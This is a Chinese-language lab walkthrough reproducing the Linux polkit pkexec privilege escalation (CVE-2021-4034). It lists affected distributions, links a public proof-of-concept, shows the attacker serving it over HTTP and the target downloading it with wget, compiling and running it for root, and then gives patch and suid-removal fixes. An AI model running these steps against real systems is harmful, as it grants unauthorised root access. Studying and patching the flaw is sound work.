# Linux-Poolkit提权

漏洞复现- Linux Polkit 权限提升漏洞（CVE-2021-4034）

**0x00 前言**

> polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令

利用版本

>  Ubuntu 21.10 (Impish Indri) policykit-1 < 0.105-31ubuntu0.1
>
>  Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life)
>
>  Ubuntu 20.04 LTS (Focal Fossa) policykit-1 < Released (0.105-26ubuntu1.2)
>
>  Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 < Released (0.105-20ubuntu0.18.04.6)
>
>  Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 < Released (0.105-14.1ubuntu0.5+esm1)
>
>  Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 < Released (0.105-4ubuntu3.14.04.6+esm1)
>
>  CentOS 6 polkit < polkit-0.96-11.el6_10.2
>
>  CentOS 7 polkit < polkit-0.112-26.el7_9.1
>
>  CentOS 8.0 polkit < polkit-0.115-13.el8_5.1
>
>  CentOS 8.2 polkit < polkit-0.115-11.el8_2.2
>
>  CentOS 8.4 polkit < polkit-0.115-11.el8_4.2
>
>  Debain stretch policykit-1 < 0.105-18+deb9u2
>
>  Debain buster policykit-1 < 0.105-25+deb10u1
>
>  Debain bookworm, bullseye policykit-1 < 0.105-31.1

`uname -a`查看内核版本

|          | 攻击者         | 靶机           |
| -------- | -------------- | -------------- |
| 操作系统 | kali           | CentOS 7       |
| IP地址   | 192.168.12.135 | 192.168.12.131 |
| 内核     |                | 5.8.7          |

> 这里使用普通用户登录靶机，进行提权，前期入侵操作默认完成

**0x01 获取POC代码**

```shell
https://gitee.com/buxiaomo/CVE-2021-4034
```

将文件存入`/tmp`目录下，开启web服务

```shell
cd /tmp

python -m http.server 8080
```

**0x02 在靶机运行poc代码**

> 如果靶机没有unzip，可以重新使用tar压缩归档

```shell

# 获取漏洞利用工具，此处在kali上使用python开启web服务器，并让被攻击主机下载提权工具源码。
wget http://192.168.12.135:8080/CVE-2021-4034-main.zip

# 解压，编译，安装。
unzip CVE-2021-4034-main.zip
cd CVE-2021-4034-main
make		

# 进行提权。
./cve-2021-4034

# 查看
whoami
# 是root就成功
```

![image-20230225180312545](https://s2.loli.net/2023/02/27/m5dU1KQVFk46W3Z.png)

**0x03 修复方法**

1、更新官方补丁，下载地址：`https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683`

2、根据不同厂商的修复建议或安全通告进行防护。

> Redhat：`https://access.redhat.com/security/cve/CVE-2021-4034`
>
> Ubuntu：`https://ubuntu.com/security/CVE-2021-4034`
>
> Debian：`https://security-tracker.debian.org/tracker/CVE-2021-4034`

3、临时防护可以移除 pkexec 的 suid位。

```shell
 chmod 0755 /usr/bin/pkexec
```

